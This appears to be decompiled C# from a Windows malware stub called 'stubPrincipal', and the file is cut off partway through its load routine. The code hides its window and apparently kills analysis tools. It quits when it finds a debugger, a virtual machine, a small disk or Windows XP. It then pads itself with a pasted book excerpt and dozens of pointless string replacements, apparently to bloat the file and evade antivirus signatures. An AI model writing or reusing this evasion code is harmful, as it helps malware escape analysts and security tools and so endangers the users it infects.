using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using stubPrincipal.My;

namespace stubPrincipal
{
	// Token: 0x02000019 RID: 25
	[DesignerGenerated]
	public class MainForm : Form
	{
		// Token: 0x06000D4A RID: 3402 RVA: 0x00041AE8 File Offset: 0x0003FCE8
		public MainForm()
		{
			base.Load += this.MainForm_Load;
			this.InitializeComponent();
		}

		// Token: 0x06000D4B RID: 3403 RVA: 0x00041B08 File Offset: 0x0003FD08
		[STAThread]
		public static void Main()
		{
			Application.Run(MyProject.Forms.MainForm);
		}

		// Token: 0x06000D4C RID: 3404 RVA: 0x00041B1C File Offset: 0x0003FD1C
		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000D4D RID: 3405 RVA: 0x00041B5C File Offset: 0x0003FD5C
		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			base.SuspendLayout();
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(800, 450);
			base.Name = "MainForm";
			this.Text = "MainForm";
			base.ResumeLayout(false);
		}

		// Token: 0x06000D4E RID: 3406 RVA: 0x00041BC0 File Offset: 0x0003FDC0
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void MainForm_Load(object sender, EventArgs e)
		{
			base.Visible = false;
			base.Hide();
			MyProject.Forms.FormularioDoCrime.Visible = false;
			MyProject.Forms.FormularioDoCrime.Hide();
			MyProject.Forms.FormulaMagicaDaPaz.Visible = false;
			MyProject.Forms.FormulaMagicaDaPaz.Hide();
			Thread.Sleep(2000);
			Classudo.matarCurioso();
			if (Classudo.DetectDebugger() | Classudo.DetectVirtualMachine() | Classudo.IsSmallDisk() | Classudo.IsXP())
			{
				Process.GetCurrentProcess().Close();
				base.Close();
				ProjectData.EndApp();
			}
			XElement xelement = new XElement(XName.Get("lixo", ""));
			xelement.Add("\n\n\n        THE\nHUMANURE\nHANDBOOK\nTHIRD EDITION\nA GUIDE TO COMPOSTING HUMAN MANURE\nby Joseph Jenkins\nISBN-13: 978-0-9644258-3-5\nISBN-10: 0-9644258-3-1\nLibrary of Congress Control Number: 2005902104\nCopyright 2005 by Joseph C. Jenkins\nAll Rights Reserved\nPortions of this book may be copied and distributed without permission as long as a) the information is not\nchanged, b) the publishing source is credited and c) the\ndistribution is not for profit.\nPublished by Joseph Jenkins, Inc.\n143 Forest Lane, Grove City, PA 16127 USA\nPhone: 814-786-9085 • Web site at josephjenkins.com\nPlease address all retail and wholesale book orders to our distributor:\nChelsea Green Publishing,\nPO Box 428, White River Junction, VT 05001\nToll free: 800-639-4099 or 802-295-6300\nPrinted with soy ink on recycled paper processed without chlorine.\nHUMANUREHANDBOOK.COM\nThis is the third edition of a self-published book. No respectable publisher would touch it with a ten foot shovel. Nevertheless, the book has now\nbeen sold in at least 57 countries worldwide and has been published in\nforeign editions on four continents. It has been talked about on NPR,\nBBC, CBC, Howard Stern, in The Wall Street Journal, Playboy Magazine\nand many other national and international venues. For more information\nabout this and the author’s other books, visit the publisher’s website at:\njosephjenkins.com.\nCover art and most of the cartoon artwork is by Tom Griffin (ottercreekstore.com). Photos are by the author unless otherwise indicated.\nThe Humanure Handbook - Third Edition\nTABLE OF CONTENTS\n1 - CRAP HAPPENS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1\n2 - WASTE NOT WANT NOT . . . . . . . . . . . . . . . . . . . . . . . . 7\n3 - MICROHUSBANDRY . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\n4 - DEEP SHIT . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69\n5 - A DAY IN THE LIFE OF A TURD . . . . . . . . . . . . . . . . . 83\n6 - COMPOSTING TOILETS AND SYSTEMS . . . . . . . . . . 103\n7 - WORMS AND DISEASE . . . . . . . . . . . . . . . . . . . . . . . . . . 121\n8 - THE TAO OF COMPOST . . . . . . . . . . . . . . . . . . . . . . . . . 155\n9 - GRAYWATER SYSTEMS . . . . . . . . . . . . . . . . . . . . . . . . . . 203\n10 - THE END IS NEAR . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 225\nTEMPERATURE CONVERSIONS . . . . . . . . . . . . . . . . . . 237\nGLOSSARY . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 238\nREFERENCES . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 240\nINDEX . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 249\nCRAP HAPPENS\nSomething’s About to Hit the Fan\n“Human beings and the natural world are on a collision course . . . No more than\none or a few decades remain before the chance to avert the threats we now confront\nwill be lost and the prospects for humanity immeasurably diminished.”\n1,600 Senior Scientists, November 18, 1992 — World Scientists Warning to Humanity\nT\nhere is a disturbing theory about the human species that\nhas begun to take on an alarming level of reality. It seems\nthat the behavior of the human race is displaying uncanny\nparallels to the behavior of pathogenic, or disease-causing,\norganisms.\nWhen viewed at the next quantum level of perspective, from\nwhich the Earth is seen as an organism and humans are seen as\nmicroorganisms, the human species looks like a menace to the planet. In fact, the human race is looking a lot like a disease — comprised\nof organisms excessively multiplying, mindlessly consuming, and\ngenerating waste with little regard for the health and well-being of its\nhost — planet Earth.\nPathogenic organisms are a nasty quirk of nature, although\nthey do have their constructive purposes, namely killing off the weak\nand infirm and ensuring the survival only of the fittest. They do this\nby overwhelming their host, by sucking the vitality out of it and leaving poison in their wake. Pathogens don’t give a damn about their\nown source of life — their host — and they often kill it outright.\nThis may seem like a silly way for a species to maintain its\nown existence; afterall, if you kill the host upon which your life\ndepends, then you must also die. But pathogens have developed a special survival tactic that allows them to carry on their existence even\nThe Humanure Handbook — Chapter One: Crap Happens 1\nafter their host has died. They simply travel to a new host, sending\nout envoys to seek out and infect another organism even as their own\npopulation dies en masse along with the original host.\nA man dying of tuberculosis coughs on his deathbed, an act\ninstigated by the infecting pathogen, ensuring that the disease has a\nchance to spread to others. A child defecates on the dirt outside her\nhome, unwittingly satisfying the needs of the parasites inhabiting her\nintestines, which require time in the soil as part of their life cycle. A\nperson stricken with cholera defecates in an outhouse which leaches\ntainted water into the ground, contaminating the village well-water\nand allowing the disease to spread to other unsuspecting villagers.\nIn the case of pathogenic organisms that kill their host, the\nbehavior is predictable: multiply without regard for any limits to\ngrowth, consume senselessly and excrete levels of waste that grievously harm the host. When this is translated into human terms, it rings\nwith a disquieting familiarity, especially when we equate human success with growth, consumption and material wealth.\nSuppose we humans are, as a species, exhibiting disease\nbehavior: we’re multiplying with no regard for limits, consuming natural resources as if there will be no future generations, and producing waste products that are distressing the planet upon which our\nvery survival depends. There are two factors which we, as a species,\nare not taking into consideration. First is the survival tactic of\npathogens, which requires additional hosts to infect. We do not have\nthe luxury of that option, at least not yet. If we are successful at continuing our dangerous behavior, then we will also succeed in marching straight toward our own demise. In the process, we can also drag\nmany other species down with us, a dreadful syndrome that is already\nunderway. This is evident by the threat of extinction that hangs, like\nthe sword of Damocles, over an alarming number of the Earth’s\nspecies.\nThere is a second consideration: infected host organisms fight\nback. As humans become an increasing menace, can the Earth try to\ndefend itself? When a disease organism infects a human, the human\nbody elevates its own temperature in order to defend itself. This rise\nin temperature not only inhibits the growth of the infecting pathogen,\nbut also greatly enhances the disease fighting capability within the\nbody. Global warming may be the Earth’s way of inducing a global\n“fever” as a reaction to human pollution of the atmosphere and\nhuman over-consumption of fossil fuels.\nWhen the internal human body temperature rises, the micro2 The Humanure Handbook — Chapter One: Crap Happens\nThe Humanure Handbook — Chapter One: Crap Happens 3\nclimate of the body changes, allowing for the sudden and rapid proliferation of antibodies, T-cells, white blood cells and other defenders\nagainst disease. As the Earth’s climate changes and as the natural\nenvironment chokes with pollution, we humans already have an idea\nof what sort of organisms nature can and will suddenly unleash to\nconfront us. They’re beginning to show themselves as insect pests and\nnew strains of deadly bacteria, viruses and algae particularly toxic to\nhumans.\nAs the planet’s temperature rises, it gains a momentum that\ncannot be stopped or even stalled, no matter how desperate or repentant we humans may eventually become. The Earth’s “fever,” like a\nspinning flywheel, will only subside in its own time. We may be creating a Frankenstein’s monster of astronomical proportions, unless,\nof course, we are pathogenic organisms. If so, then we really don’t\ncare, do we?\nPathogens can often dwell for quite some time within the host\norganism without causing disease symptoms. Then something happens to spark their growth — they gain a sudden foothold and begin\nproliferating rapidly. It is at this point that undeniable disease effects\nbegin to show themselves.\nHumans began to show their pathogenic potential toward the\nplanet during the 1950s, ravenously devouring natural resources and\ndiscarding waste into the environment with utter carelessness. From\n1990 to 1997, human global consumption grew as much as it did from\nthe beginning of civilization until 1950. In fact, the global economy\ngrew more in 1997 alone than during the entire 17th century.\n1\nBy the end of the 20th century, our consumptive and wasteful\nlifestyles had painted a bleak global picture. Almost half of the\nworld’s forests are gone. Between 1980 and 1995, we lost areas of forest larger than the size of Mexico, and we’re still losing forests at a\nrate of millions of acres a year.\n2 Water tables are falling on every continent. Fisheries are collapsing, farmland is eroding, rivers are drying, wetlands are disappearing and species are becoming extinct.3\nFurthermore, the human population is now increasing by 80 million\neach year (roughly the population of ten Swedens). Population\ngrowth without foresight, management and respect for the environment virtually guarantees increased consumption and waste with\neach passing year.\n4\nThe natural background rate of extinctions is estimated to be\nabout one to ten species per year. Currently, it’s estimated that we’re\ninstead losing 1,000 species per year. More than 10% of all bird\nspecies, 25% of all mammals, and 50% of all primates are threatened\nwith extinction.5 Of 242,000 plant species surveyed by the World\nConservation Union in 1997, one out of every eight (33,000 species)\nwas threatened with extinction.6\nWhat would drive humanity to damage its life support system\nin this way? Why would we disregard our host organism, the Earth,\nas if we were nothing more than a disease intent upon its destruction?\nOne answer, as we have seen, is consumption. We embrace the idea\nthat more is better, measuring success with the yardstick of material\nwealth. Some startling statistics bear this out: the 225 richest people\nin the world (0.000003% of the world’s population) have as much\nacquired wealth as the poorest half of the entire human race. The\nwealth of the world’s three richest people is equivalent to the total\noutput of the poorest 48 countries. We in the United States certainly\ncan raise our hands and be counted when it comes to consumption —\nour intake of energy, grain and materials is the highest on the planet.\nAmericans can admit to using three tons of materials per month, each\nof us, and that’s not counting food and fuel. Despite the fact that we\nare only 1/20th of the globe’s population, we use 1/3 of its resources.\nWe would require no less than three planet Earths to sustain the\nentire world at this level of consumption.7\nThere are those who scoff at the idea that a tiny organism\nsuch as the human species could mortally affect such an ancient and\nimmense being as Mother Earth. The notion that we can be powerful\n4 The Humanure Handbook — Chapter One: Crap Happens\nThe Humanure Handbook — Chapter One: Crap Happens 5\nPathogen Alert!\n• Although the natural background rate of extinctions is estimated to be about one to ten species\nper year, we are currently losing 1,000 species\nper year.\n• Since the 1950s, more than 750 million tons of\ntoxic chemical wastes have been dumped into\nthe environment.16\n• By the end of the 1980s, production of humanmade synthetic organic chemicals linked to cancer had exceeded 200 billion pounds per year, a hundred-fold increase in only two generations.17\n• By 1992, in the U.S. alone, over 435 billion pounds of carbon-based synthetic chemicals were being produced.18\n• In 1994, well over a million tons of toxic chemicals were released into the\nenvironment. Of these, 177 million pounds were known or suspected carcinogens.19\n• There are now about 75,000 chemicals in commercial use, and 3,750 to\n7,500 are estimated to be cancer-causing to humans.\n• There are 1,231 “priority” Superfund sites, with 40 million people (one in\nevery six Americans) living within four miles of one.20\n• 40% of Americans can expect to contract cancer in their lifetimes.\n• 80% of all cancer is attributed to environmental influences.\n• Breast cancer rates are thirty times higher in the United States than in\nparts of Africa.\n• Childhood cancers have risen by one third since 1950 and now one in\nevery four hundred Americans can expect to develop cancer before the age\nof fifteen.\n• The U.S. EPA projects that tens of thousands of additional fatal skin cancers will result from the ozone depletion that has already occurred over\nNorth America.21\n• Male fish are being found with female egg sacs, male alligators with shriveled penises, and human male sperm counts are plummeting.\n• The average person can now expect to find at least 250 chemical contaminants in his or her body fat.22\n• Fifty new diseases have emerged since 1950, including Ebola, Lyme’s\nDisease, Hantavirus, and HIV.\n23\n• Earth’s atmospheric concentrations of CO2\nhave climbed to the highest\nlevel in 150,000 years.\nbcdefhlq\nruwy\nenough to inflict illness on a planetary being is nothing more than\negotism. Where is there any evidence that a planet can get sick and\ndie? Well, how about Mars?\nWhat did happen to Mars, anyway? Our next door neighbor,\nthe Red Planet, apparently was once covered with flowing rivers.\nWhat happened to them? Rivers suggest an atmosphere. Where is it?\nWas Mars once a vital, thriving planet? If so, why does it now appear\ndead? Could a lifeform on its surface have proliferated so abundantly and so recklessly that it altered the planet’s atmosphere, thereby\nknocking it off-kilter and destroying it? Is that what’s happening to\nour own planet? Will it be our legacy in this solar system to leave\nbehind another lonely, dead rock to revolve around the sun? Or will\nwe simply destroy ourselves while the Earth, stronger than her\nMartian brother, overcomes our influence and survives to flourish\nanother billion years — without us?\nThe answer, if I may wildly speculate, is neither — we will\ndestroy neither the Earth nor ourselves. Instead, we will learn to live\nin a symbiotic relationship with our planet. To put it simply, the\nhuman species has reached a fork in the road of its evolution. We can\ncontinue to follow the way of disease-causing pathogens, or we can\nchart a new course as dependent and respectful inhabitants on this\ngalactic speck of dust we call Earth. The former requires only an egocentric lack of concern for anything but ourselves, living as if there\nwill be no future human generations. The latter, on the other hand,\nrequires an awareness of ourselves as a dependent part of a Greater\nBeing. This may require a hefty dose of humility, which we can either\nmuster up ourselves, or wait until it’s meted out to us, however tragically, by the greater world around us. Either way, time is running\nout.\nIt is ironic that humans have ignored one waste issue that all\nof us contribute to each and every day — an environmental problem\nthat has stalked our species from our genesis, and which will accompany us to our extinction. Perhaps one reason we have taken such a\nhead-in-the-sand approach to the recycling of human excrement is\nbecause we can’t even talk about it. If there is one thing that the\nhuman consumer culture refuses to deal with maturely and constructively, it’s bodily excretions. This is the taboo topic, the unthinkable\nissue. It’s also the one we are about to dive headlong into. For waste\nis not found in nature — except in human nature. It’s up to us\nhumans to unlock the secret to its elimination. Nature herself provides a key and she has held it out to us for eons.\n6 The Humanure Handbook — Chapter One: Crap Happens\nWASTE NOT WANT NOT\n“WASTE: . . Spoil or destruction, done or permitted, to lands, houses, gardens, trees, or other corporeal hereditaments, by the tenant thereof . . . Any\nunlawful act or omission of duty on the part of the tenant which results in\npermanent injury to the inheritance . . .” Black’s Law Dictionary\nA\nmerica is not only a land of industry and commerce, it’s\nalso a land of consumption and waste, producing between\n12 and 14 billion tons of waste annually. Much of our waste\nconsists of organic material including food residues, municipal leaves, yard materials, agricultural residues, and human and\nlivestock manures, all of which should be returned to the soil from\nwhich they originated. These organic materials are very valuable agriculturally, a fact well known among organic gardeners and farmers.\nFeces and urine are examples of natural, beneficial, organic\nmaterials excreted by the bodies of animals after completing their\ndigestive processes. They are only “waste” when we discard them.\nWhen recycled, they are resources, and are often referred to as\nmanures, but never as waste, by the people who do the recycling.\nWe do not recycle waste. It’s a common semantic error to say\nthat waste is, can be, or should be recycled. Resource materials are\nrecycled, but waste is never recycled. That’s why it’s called “waste.”\nWaste is any material that is discarded and has no further use. We\nhumans have been so wasteful for so long that the concept of waste\nThe Humanure Handbook — Chapter Two: Waste Not Want Not 7\nelimination is foreign to us. Yet, it is an important concept.\nWhen a potato is peeled, the peels aren’t kitchen waste —\nthey’re still potato peels. When they’re collected for composting, they\nare being recycled and no waste is produced.\nComposting professionals sometimes refer to recycled materials as “waste.” Many of the people who are developing municipal\ncomposting programs came from the waste management field, a field\nin which refuse has always been termed “waste.” Today, however, the\nuse of the term “waste” to describe recycled materials is an unpleasant semantic habit that must be abandoned. Otherwise, one could\nrefer to leaves in the autumn as “tree waste,” because they are no\nlonger needed by the tree and are discarded. Yet, when one walks into\nthe forest, where does one see waste? The answer is “nowhere,”\nbecause the forest’s organic material is recycled naturally, and no\nwaste is created. Ironically, leaves and grass clippings are referred to\nas “yard waste” by some compost professionals, another example of\nthe persistent waste mentality plaguing our culture.\nOne organism’s excrement is another’s food. Everything is\nrecycled in natural systems, thereby eliminating waste. Humans create waste because we insist on ignoring the natural systems upon\nwhich we depend. We are so adept at doing so that we take waste for\ngranted and have given the word a prominent place in our vocabulary.\nWe have kitchen “waste,” garden “waste,” agricultural “waste,”\nhuman “waste,” municipal “waste,” “biowaste,” and on and on. Yet,\nour long-term survival requires us to learn to live in harmony with\nour host planet. This also requires that we understand natural cycles\nand incorporate them into our day to day lives. In essence, this means\nthat we humans must attempt to eliminate waste altogether. As we\nprogressively eliminate waste from our living habits, we can also progressively eliminate the word “waste” from our vocabulary.\n“Human waste” is a term that has traditionally been used to\nrefer to human excrements, particularly fecal material and urine,\nwhich are by-products of the human digestive system. When discarded, as they usually are, these materials are colloquially known as\nhuman waste, but when recycled for agricultural purposes, they’re\nknown by various names, including night soil when applied raw to\nfields in Asia.\nHumanure, unlike human waste, is not waste at all — it is an\norganic resource material rich in soil nutrients. [...string is too long...]");
			XElement xelement2 = xelement;
			int num = 0;
			int num2 = 1;
			checked
			{
				do
				{
					num++;
					num2++;
				}
				while (num2 <= 3000);
				Thread.Sleep(num);
				Strings.Replace(xelement2.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
				Strings.Replace(xelement2.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
